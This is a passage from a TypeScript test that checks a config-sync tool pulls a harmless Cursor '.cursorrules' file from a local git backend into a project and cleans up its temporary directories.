    const pullCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pullclone-")), "repo");
    extraClonedProjectFiles.files = [
      { relativeKeyPath: "cursor/.cursorrules", content: Buffer.from("always write tests first\n") },
    ];
    try {
      const pullBackend = new LocalBareGitBackend(bareDir, pullCloneDir);
      await pullBackend.initRemote();
      await pullBackend.ensureLocalClone();
      const result = await pullProject(
        { backend: pullBackend, detectors: [cursorDetector], homeDir: targetHome, registryPath: join(targetHome, "registry.json"), lockPath: join(targetHome, "repo.lock") },
        targetProjectDir,
        "acme/widgets",
      );

      expect(result.changedFiles).toContain("cursor/.cursorrules");
      expect(result.skippedUnsafe).not.toContain("cursor/.cursorrules");
      expect(readFileSync(join(targetProjectDir, ".cursorrules"), "utf8")).toBe("always write tests first\n");
    } finally {
      extraClonedProjectFiles.files = [];
      rmSync(targetProjectDir, { recursive: true, force: true });
      rmSync(targetHome, { recursive: true, force: true });
      rmSync(bareDir, { recursive: true, force: true });
      rmSync(pullCloneDir, { recursive: true, force: true });
    }
  });
});
